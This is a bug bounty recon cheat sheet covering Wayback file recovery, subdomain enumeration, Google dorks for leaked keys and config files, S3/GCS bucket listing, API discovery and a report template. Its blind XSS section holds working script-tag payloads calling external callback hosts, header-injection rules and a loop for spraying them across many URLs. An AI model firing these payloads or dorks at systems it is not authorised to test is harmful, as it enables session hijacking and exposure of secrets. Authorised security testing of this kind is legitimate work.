# Bug Bounty Reconnaissance Methodologies — Complete Reference

> All techniques taught and used in this session, compiled for revision and AI handoff.

---

## 1. INFORMATION DISCLOSURE via WAYBACK MACHINE (Archived Files)

**Goal:** Find sensitive files that were once public but are now deleted, yet still accessible via web archives.

### Step 1: Collect Historical URLs
```bash
curl -s "http://web.archive.org/cdx/search/cdx?url=*.target.com/*&output=text&fl=original&collapse=urlkey" -o wayback_urls.txt
```

### Step 2: Filter for Sensitive Extensions
```bash
grep -E "\.pdf$|\.csv$|\.db$|\.zip$|\.xlsx$|\.xls$|\.doc$|\.docx$|\.sql$|\.json$|\.env$|\.yml$|\.yaml$|\.config$|\.bak$|\.old$|\.tar$|\.gz$|\.rar$|\.7z$" wayback_urls.txt > sensitive_files.txt
```

### Step 3: Check Which Are 404 (Deleted from Live)
```bash
while read url; do
  status=$(curl -s -o /dev/null -w "%{http_code}" "$url")
  echo "$status $url"
done < sensitive_files.txt | grep "^404" > deleted_files.txt
```

### Step 4: Retrieve from Wayback Archive
Take each 404 URL and paste it into `web.archive.org/web/*/[URL]` to check for archived snapshots.

### One-liner for Sensitive Files
```bash
curl -s "http://web.archive.org/cdx/search/cdx?url=*.target.com/*&output=text&fl=original&collapse=urlkey" | grep -E "\.pdf$|\.csv$|\.db$|\.zip$|\.xlsx$|\.xls$|\.sql$"
```

### Additional Sources
- **VirusTotal:** `https://www.virustotal.com/ui/domains/{target}/urls`
- **AlienVault OTX:** `https://otx.alienvault.com/api/v1/indicators/domain/{target}/url_list`

---

## 2. BLIND XSS (BXSS)

**Goal:** Inject XSS payloads that execute in back-end admin panels or internal systems.

### Step 1: Find Forms via Google Dorks
```
site:target.com inurl:contact
site:target.com inurl:feedback
site:target.com inurl:support
site:target.com "contact us"
site:target.com "report a problem"
site:target.com "get in touch"
```

### Step 2: Inject Payloads
Use a Blind XSS callback service like:
- `https://xsshunter.com`
- `https://interact.sh`
- Self-hosted: `https://github.com/R0B1NL1N/Blind-XSS-Payloads`

Payload example:
```html
<script src="https://your-callback.bxss.report/callback.js"></script>
```

### Step 3: Burp Suite Match & Replace (Header Injection)
Configure Burp Proxy → Match and Replace:
- **Match:** `User-Agent.*`
- **Replace:** `User-Agent: Mozilla/5.0"><script src=https://your-callback.bxss.report/cb.js></script>`
- Do the same for: `Referer`, `Origin`, `Host`, `X-Forwarded-For`

### Step 4: Automated Parameter Discovery
```bash
# Arjun to find hidden params
arjun -u https://target.com/api/endpoint

# BXSS oneliner for mass testing
cat urls.txt | while read url; do
  curl -s "$url" -H "User-Agent: \"><script src=https://cb.bxss.report/cb.js></script>" -o /dev/null
done
```

### Step 5: XIF Metadata Injection
Embed payload in JPEG metadata:
```
Windows: Right-click → Properties → Details → Comment field
Inject: <script src=https://callback.bxss.report/cb.js></script>
```
When the server processes the image metadata, the payload executes.

### Step 6: Encoded Payload Cycling
Create an HTML file with multiple encoding variants:
```html
<!-- Double encoding -->
<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>
<!-- Triple encoding -->
<img src=x onerror=%25%36%31%25%36%63%25%36%35%25%37%32%25%37%34(1)>
<!-- Unicode escaping -->
<img src=x onerror=\u0061\u006c\u0065\u0072\u0074(1)>
<!-- Hex entities -->
<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>
```

---

## 3. TOOL INSTALLATION & SETUP

### Subfinder
```bash
go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
```

### Nuclei
```bash
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
nuclei -update-templates
```

### Katana
```bash
go install -v github.com/projectdiscovery/katana/cmd/katana@latest
```

### HTTPX
```bash
go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
```

### DNSX
```bash
go install -v github.com/projectdiscovery/dnsx/cmd/dnsx@latest
```

### S3Scanner
```bash
git clone https://github.com/sa7mon/S3Scanner.git
pipx install s3scanner
```

### Community Scripts
```bash
git clone https://github.com/scripts.git
# Contains: passive_fuzzer.sh, wayback.sh, alienvault.sh, urlscan.py, virustotal.sh, dorking.py
```

### Other Tools
```bash
pipx install uro            # URL deduplication
pipx install arjun          # Parameter discovery
pipx install googlesearch-python  # Google dorking
go install -v github.com/tomnomnom/waybackurls@latest
go install -v github.com/tomnomnom/gf@latest
go install -v github.com/tomnomnom/unfurl@latest
go install -v github.com/tomnomnom/anew@latest
go install -v github.com/ffuf/ffuf/v2@latest
```

---

## 4. SUBDOMAIN ENUMERATION

### Passive (subfinder)
```bash
subfinder -d target.com -o subs.txt
```

### Certificate Transparency (crt.sh)
```bash
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sort -u
```

### DNS Brute Force (puredns / shuffledns)
```bash
puredns bruteforce /usr/share/wordlists/subdomains.txt target.com
```

### Resolve & Filter Live
```bash
httpx -l subs.txt -o live.txt -threads 100
```

---

## 5. CLOUD STORAGE AUDITING

### GCS Bucket Enumeration
```bash
# Check if bucket is listable
curl -s "https://storage.googleapis.com/bucket-name/"
# Response: 200 = public listing, 403 = exists but private, 404 = doesn't exist

# Check if bucket exists (HEAD request)
curl -s -o /dev/null -w "%{http_code}" "https://storage.googleapis.com/bucket-name/"

# Using gsutil
gsutil ls gs://bucket-name/
```

### S3 Bucket Enumeration
```bash
# Using S3Scanner
s3scanner -bucket bucket-name

# Manual check
curl -s "https://bucket-name.s3.amazonaws.com/"
curl -s "https://bucket-name.s3.region.amazonaws.com/"
```

### Common Bucket Names to Check
```
target, target-backup, target-data, target-assets, target-static
target-dev, target-staging, target-prod, target-logs
target-uploads, target-cdn, target-media, target-images
target-config, target-scripts, target-api, target-app
```

---

## 6. GOOGLE DORKING

### Common Dorks
```
site:target.com intitle:"index of"           # Directory listing
site:target.com filetype:env                 # Environment files
site:target.com filetype:sql                 # SQL dumps
site:target.com filetype:log                 # Log files
site:target.com filetype:bak                 # Backup files
site:target.com inurl:wp-config.php          # WordPress config
site:target.com inurl:admin                  # Admin panels
site:target.com inurl:api                    # API endpoints
site:target.com intext:"password" filetype:log
site:target.com "s3.amazonaws.com"           # S3 references
site:target.com "storage.googleapis.com"     # GCS references
site:target.com "-----BEGIN RSA PRIVATE KEY-----"  # Leaked keys
```

### Automated Dorking
Using `scripts/dorking.py` or:
```bash
python3 -m googlesearch-python "site:target.com filetype:pdf"
```

---

## 7. URL COLLECTION & FILTERING

### Wayback Machine (Full Pipeline)
```bash
# Collect
curl -s "http://web.archive.org/cdx/search/cdx?url=*.target.com/*&output=text&fl=original&collapse=urlkey" > all_urls.txt

# Filter endpoints
grep -E "\.js$|\.json$|\.php$|\.asp$|\.aspx$|\.jsp$" all_urls.txt > endpoints.txt

# Filter for sensitive files
grep -E "\.pdf$|\.csv$|\.zip$|\.db$|\.sql$|\.env$|\.bak$|\.xls$|\.xlsx$|\.doc$|\.docx$" all_urls.txt > sensitive.txt

# Check file sizes
du -sh all_urls.txt
```

### AlienVault OTX
```bash
curl -s "https://otx.alienvault.com/api/v1/indicators/domain/target.com/url_list?limit=500" | jq -r '.url_list[].url' | sort -u
```

### URLScan.io
```bash
# Using urlscan.py from scripts
# Or API:
curl -s "https://urlscan.io/api/v1/search/?q=domain:target.com" | jq -r '.results[].page.url'
```

### VirusTotal
```bash
# Using virustotal.sh from scripts
# Requires API key
```

---

## 8. API RECONNAISSANCE

### OpenAPI Spec Discovery
Check these paths for API specifications:
```bash
curl -s "https://target.com/openapi.json"
curl -s "https://target.com/api/v1/openapi.json"
curl -s "https://target.com/api/v2/openapi.json"
curl -s "https://target.com/swagger.json"
curl -s "https://target.com/api/swagger.json"
curl -s "https://target.com/.well-known/api-catalog"
curl -s "https://target.com/docs/llms.txt"
```

### API Endpoint Brute Force
```bash
# Use ffuf with API wordlist
ffuf -w /usr/share/wordlists/api.txt -u https://api.target.com/FUZZ -fc 401,404
```

### Common API Patterns
```
/api, /api/v1, /api/v2, /api/v3
/graphql, /rest, /soap
/swagger, /docs, /redoc
/health, /status, /ping, /metrics
```

---

## 9. HEADER & CONFIGURATION ANALYSIS

### Security Headers Check
```bash
curl -sI "https://target.com" | grep -iE "strict-transport-security|x-frame-options|x-content-type-options|content-security-policy|x-xss-protection|referrer-policy"
```

### CORS Check
```bash
curl -s -D - -H "Origin: https://evil.com" -H "Access-Control-Request-Method: GET" -X OPTIONS "https://api.target.com/endpoint"
```

### CSP Analysis
Look for:
- `unsafe-inline` / `unsafe-eval` (potential XSS)
- Sentry DSNs (exposed error tracking)
- Internal URLs / IPs in CSP directives

### Server Header Analysis
```bash
curl -sI "https://target.com" | grep -i "server\|x-powered-by\|x-aspnet-version\|x-dc\|via"
```

---

## 10. GCS BUCKET CONTENT ANALYSIS

When a bucket is listable, enumerate its contents:
```bash
# Get full listing
curl -s "https://storage.googleapis.com/bucket-name/" > listing.xml

# Parse object keys
grep -oP '(?<=<Key>).*?(?=</Key>)' listing.xml > objects.txt

# Check for interesting files
grep -E "\.env$|\.json$|\.yaml$|\.config$|\.pem$|\.key$|cred" objects.txt

# Try to download specific objects
curl -s "https://storage.googleapis.com/bucket-name/file.json" -o file.json

# Check for source maps
grep "\.js\.map" objects.txt
```

---

## 11. PROGRESSIVE RECON WORKFLOW

### Phase 1: Target Selection & Scope Check
```
1. Check HackerOne program scope
2. Identify in-scope domains/assets
3. Note rules (rate limits, prohibited actions)
```

### Phase 2: Passive Recon
```
1. Subdomain enumeration (subfinder, crt.sh)
2. URL collection (Wayback, AlienVault, URLScan)
3. Google dorking
4. GitHub search for leaked keys/secrets
```

### Phase 3: Active Recon
```
1. Live host resolution (httpx)
2. Technology fingerprinting (nuclei tech-detect)
3. Port scanning (if in scope)
4. Bucket enumeration (S3Scanner, GCS checks)
```

### Phase 4: Vulnerability Scanning
```
1. Nuclei scan (takeover, misconfig, exposed-panels)
2. Blind XSS injection
3. Wayback file recovery
4. API endpoint discovery
```

### Phase 5: Deep Testing
```
1. Authenticated testing (if accounts available)
2. IDOR / authorization checks
3. API parameter fuzzing
4. CORS / header analysis
```

### Phase 6: Documentation
```
1. Save all findings with reproduction steps
2. Note scope status (in/out of scope)
3. Prioritize by severity and bounty probability
4. Save as structured markdown report
```

---

## 12. COMMON COMMAND CHEAT SHEET

```bash
# Subdomain enumeration
subfinder -d target.com -o subs.txt

# Live host check
httpx -l subs.txt -o live.txt -title -tech-detect -status-code

# Wayback URL collection
curl -s "http://web.archive.org/cdx/search/cdx?url=*.target.com/*&output=text&fl=original&collapse=urlkey" > urls.txt

# URL deduplication
cat urls.txt | uro > unique_urls.txt

# Filter by extension
cat urls.txt | grep -E "\.js$|\.json$|\.php$"

# Nuclei scan
nuclei -l live.txt -t ~/nuclei-templates/ -tags takeover,exposed-panels,misconfig

# GCS bucket check
curl -s -o /dev/null -w "%{http_code}" "https://storage.googleapis.com/bucket-name/"

# S3 bucket check
s3scanner -bucket bucket-name

# DNS resolution
dig target.com ANY +short

# Certificate transparency
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sort -u

# Google search
python3 -m googlesearch-python "site:target.com filetype:pdf"

# Parameter discovery
arjun -u https://target.com/endpoint

# File size check
du -sh file.txt

# URL count
wc -l file.txt
```

---

## 13. SCOPE VALIDATION CHECKLIST

Before reporting any finding, verify:
- [ ] Is the domain/subdomain listed in the program scope?
- [ ] Is the finding excluded (third-party, CDN, etc.)?
- [ ] Does it violate program rules (brute-force, DoS, etc.)?
- [ ] Is the impact clearly demonstrable?
- [ ] Can it be reproduced with a simple curl command?
- [ ] Is the severity appropriate (no over-claiming)?
- [ ] Are any credentials/secrets redacted from evidence?

---

## 15. FINDING PRIORITIZATION MATRIX

| Priority | Finding Type | Bounty Probability | Example |
|----------|-------------|-------------------|---------|
| P1 | Auth bypass / IDOR | High | Access other users' data |
| P1 | Public GCS/S3 bucket | High | Full bucket listing |
| P1 | Blind XSS in admin | High | Session hijack |
| P2 | OWA with Basic Auth | Medium-High | Info disclosure |
| P2 | Internal domain leak | Medium | Attack surface mapping |
| P2 | CSP with unsafe-inline | Medium | XSS surface |
| P3 | Server version exposed | Low-Med | Fingerprinting |
| P3 | Analytics tokens | Low | Data injection |
| Info | Subdomain list | None | Context only |

---

## 16. REPORT FORMAT TEMPLATE

```markdown
# [Target] — [Finding Title]

**Program:** [HackerOne/URL]
**Severity:** [Critical/High/Medium/Low/Info]
**Category:** [Type of vulnerability]

## Summary
[1-2 sentence description]

## Endpoint
`https://target.com/vulnerable-endpoint`

## Steps to Reproduce
```bash
curl -X GET "https://target.com/vulnerable-endpoint" -v
```

## Evidence
[Response headers, body, screenshots]

## Impact
[What an attacker can do with this]

## Remediation
[How to fix it]

## Scope Check
- [ ] Domain is in scope: [Yes/No]
- [ ] Not excluded by program rules: [Yes/No]
```

---

**File location:** `~/recon_reports/METHODOLOGIES.md`
**Generated:** June 27, 2026
**Purpose:** Complete reference of all bug bounty recon methodologies taught in this session, for revision and AI handoff.
